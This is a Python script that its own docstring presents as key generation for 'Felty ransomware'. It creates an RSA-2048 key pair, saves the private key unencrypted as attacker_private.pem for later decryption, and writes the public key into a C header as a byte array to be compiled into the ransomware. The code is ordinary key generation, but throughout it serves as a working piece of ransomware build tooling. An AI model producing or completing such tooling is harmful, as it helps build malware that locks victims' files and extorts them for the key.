#!/usr/bin/env python3
"""
felty_keygen.py - Generate RSA-2048 key pair for Felty ransomware.
Outputs:
  - attacker_private.pem  (PEM private key - KEEP SECRET for decryption)
  - attacker_pubkey.h     (C header with DER public key to embed in ransomware)
"""

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)

with open("attacker_private.pem", "wb") as f:
    f.write(key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption()
    ))
print("[+] Wrote: attacker_private.pem")

pub_der = key.public_key().public_bytes(
    encoding=serialization.Encoding.DER,
    format=serialization.PublicFormat.SubjectPublicKeyInfo
)

with open("attacker_pubkey.h", "w") as f:
    f.write("#ifndef ATTACKER_PUBKEY_H\n#define ATTACKER_PUBKEY_H\n\n")
    f.write("unsigned char attacker_pubkey_der[] = {\n")
    for i, b in enumerate(pub_der):
        if i % 12 == 0:
            f.write("    ")
        f.write(f"0x{b:02x},")
        if (i + 1) % 12 == 0:
            f.write("\n")
    if len(pub_der) % 12 != 0:
        f.write("\n")
    f.write("};\n")
    f.write(f"size_t attacker_pubkey_len = {len(pub_der)};\n\n")
    f.write("#endif\n")

print(f"[+] Wrote: attacker_pubkey.h ({len(pub_der)} bytes)")
print("[+] Done. Keep attacker_private.pem safe for decryption.")